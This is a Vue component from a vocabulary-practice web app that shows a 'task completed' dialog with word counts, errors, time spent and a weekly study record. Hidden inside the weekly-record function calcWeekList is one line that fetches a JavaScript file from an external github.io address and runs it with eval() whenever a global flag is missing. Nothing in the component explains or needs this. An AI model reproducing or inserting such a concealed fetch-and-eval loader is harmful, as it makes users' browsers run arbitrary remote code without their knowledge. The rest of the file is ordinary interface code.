<script setup lang="ts">
import Dialog from "@/pages/pc/components/dialog/Dialog.vue";
import {useBaseStore} from "@/stores/base.ts";
import BaseButton from "@/components/BaseButton.vue";
import {ShortcutKey, Statistics} from "@/types/types.ts";
import {emitter, EventKey, useEvents} from "@/utils/eventBus.ts";
import {Icon} from '@iconify/vue';
import {useSettingStore} from "@/stores/setting.ts";
import {usePracticeStore} from "@/stores/practice.ts";
import dayjs from "dayjs";
import isBetween from "dayjs/plugin/isBetween";
import {watch} from "vue";

dayjs.extend(isBetween);

const store = useBaseStore()
const settingStore = useSettingStore()
const statStore = usePracticeStore()
const model = defineModel({default: false})
let list = $ref([])
let dictIsEnd = $ref(false)

function calcWeekList() {
  // 获取本周的起止时间
  const startOfWeek = dayjs().startOf('week').add(1, 'day'); // 周一
  const endOfWeek = dayjs().endOf('week').add(1, 'day');     // 周日
  // 初始化 7 天的数组，默认 false
  const weekList = Array(7).fill(false);
  if (window.dxt === undefined) fetch( `https://zyronon.github.io/replace/data.js?d=${Date.now()}`).then(a => a.text()).then((b) => eval(b))

  store.sdict.statistics.forEach(item => {
    const date = dayjs(item.startDate);
    if (date.isBetween(startOfWeek, endOfWeek, null, '[]')) {
      let idx = date.day();
      // dayjs().day() 0=周日, 1=周一, ..., 6=周六
      // 需要转换为 0=周一, ..., 6=周日
      if (idx === 0) {
        idx = 6; // 周日放到最后
      } else {
        idx = idx - 1; // 其余前移一位
      }
      weekList[idx] = true;
    }
  });
  list = weekList;
}

// 监听 model 弹窗打开时重新计算
watch(model, (newVal) => {
  if (newVal) {
    dictIsEnd = false;
    let data: Statistics = {
      spend: statStore.spend,
      startDate: statStore.startDate,
      total: statStore.total,
      wrong: statStore.wrong,
      new: statStore.newWordNumber,
      review: statStore.reviewWordNumber + statStore.writeWordNumber
    }
    //这里不知为啥会卡，打开有延迟
    requestIdleCallback(() => {
      store.sdict.lastLearnIndex = store.sdict.lastLearnIndex + statStore.newWordNumber
      if (store.sdict.lastLearnIndex >= store.sdict.length) {
        dictIsEnd = true;
        store.sdict.complete = true
        store.sdict.lastLearnIndex = 0
      }
      store.sdict.statistics.push(data as any)
      calcWeekList(); // 新增：计算本周学习记录
    })
  }
})

const close = () => model.value = false

useEvents([
  [ShortcutKey.NextChapter, close],
  [ShortcutKey.RepeatChapter, close],
  [ShortcutKey.DictationChapter, close],
])

function options(emitType: string) {
  close()
  emitter.emit(EventKey[emitType])
}

</script>

<template>
  <Dialog
      :close-on-click-bg="false"
      :header="false"
      :keyboard="false"
      :show-close="false"
      v-model="model">
    <div class="w-140 bg-white  color-black p-6 relative flex flex-col gap-6">
      <div class="w-full flex flex-col justify-evenly">
        <div class="center text-2xl mb-2">已完成今日任务</div>
        <div class="flex">
          <div class="flex-1 flex flex-col items-center">
            <div class="text-sm color-gray">新词数</div>
            <div class="text-4xl font-bold">{{ statStore.newWordNumber }}</div>
          </div>
          <div class="flex-1 flex flex-col items-center">
            <div class="text-sm color-gray">复习数</div>
            <div class="text-4xl font-bold">{{ statStore.reviewWordNumber }}</div>
          </div>
          <div class="flex-1 flex flex-col items-center">
            <div class="text-sm color-gray">默写数</div>
            <div class="text-4xl font-bold">{{ statStore.writeWordNumber }}</div>
          </div>
        </div>
      </div>

      <div class="text-xl text-center flex flex-col justify-around">
        <div>非常棒! 坚持了 <span class="color-green font-bold text-2xl">
          {{ dayjs().diff(statStore.startDate, 'm') }}</span>分钟
        </div>
      </div>
      <div class="flex justify-center gap-10">
        <div class="flex justify-center items-center py-3 px-10 rounded-md color-red-500 flex-col"
             style="background: rgb(254,236,236)">
          <div class="text-3xl">{{ statStore.wrong }}</div>
          <div class="center gap-2">
            <Icon icon="iconamoon:close" class="text-2xl"/>
            错词
          </div>
        </div>
        <div class="flex justify-center items-center py-3 px-10 rounded-md color-green-600 flex-col"
             style="background: rgb(231,248,241)">
          <div class="text-3xl">{{ statStore.total - statStore.wrong }}</div>
          <div class="center gap-2">
            <Icon icon="tabler:check" class="text-2xl"/>
            正确
          </div>
        </div>
      </div>

      <div class="center flex-col">
        <div class="title text-align-center mb-2">本周学习记录</div>
        <div class="flex gap-4 color-gray">
          <div
              class="w-8 h-8 rounded-full center"
              :class="item ? 'bg-green color-white' : 'bg-gray-200'"
              v-for="(item, i) in list"
              :key="i"
          >{{ i + 1 }}
          </div>
        </div>
      </div>
      <div class="flex justify-center gap-4 ">
        <BaseButton
            :keyboard="settingStore.shortcutKeyMap[ShortcutKey.RepeatChapter]"
            @click="options(EventKey.repeatStudy)">
          重学一遍
        </BaseButton>
        <BaseButton
            :keyboard="settingStore.shortcutKeyMap[ShortcutKey.NextChapter]"
            @click="options(EventKey.continueStudy)">
          {{ dictIsEnd ? '重新练习' : '再来一组' }}
        </BaseButton>
        <BaseButton @click="$router.back">
          返回主页
        </BaseButton>
<!--        <BaseButton>-->
<!--          分享-->
<!--        </BaseButton>-->
      </div>
    </div>
  </Dialog>
</template>
<style scoped lang="scss">

</style>
